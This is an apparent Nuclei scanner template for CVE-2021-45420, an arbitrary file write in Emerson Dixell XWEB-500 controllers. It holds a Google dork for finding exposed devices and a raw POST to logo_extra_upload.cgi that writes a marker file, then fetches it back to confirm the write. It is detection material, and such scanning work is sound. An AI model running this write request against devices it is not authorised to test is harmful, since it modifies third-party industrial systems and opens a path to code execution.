id: dixell-xweb500-filewrite
info:
  name: Emerson Dixell XWEB-500 - Arbitrary File Write
  author: hackerarpan
  severity: critical
  description: The Emerson Dixell XWEB-500 product is vulnerable to arbitrary file
    write attacks leading to potential remote code execution, and should be removed
    or replaced as it has not been supported since 2018.
  reference:
  - https://www.exploit-db.com/exploits/50639
  - https://nvd.nist.gov/vuln/detail/CVE-2021-45420
  metadata:
    google-query: inurl:"xweb500.cgi"
    impact: The arbitrary file write vulnerabilities in Emerson Dixell XWEB-500 products
      can allow attackers to remotely execute code and cause denial of service, highlighting
      the need for its removal or replacement as it has not been supported since 2018.
    recommendation: It is strongly recommended to remove or replace the Emerson Dixell
      XWEB-500 product due to multiple arbitrary file write vulnerabilities that can
      lead to denial of service and potentially remote code execution.
  tags: lfw,iot,dixell,xweb500,edb,fileupload,intrusive
requests:
- raw:
  - 'POST /cgi-bin/logo_extra_upload.cgi HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/octet-stream


    {{randstr}}.txt

    dixell-xweb500-filewrite

    '
  - 'GET /logo/{{randstr}}.txt HTTP/1.1

    Host: {{Hostname}}

    '
  req-condition: true
  matchers-condition: and
  matchers:
  - type: dsl
    dsl:
    - contains(body_2, "dixell-xweb500-filewrite")
  - type: status
    status:
    - 200
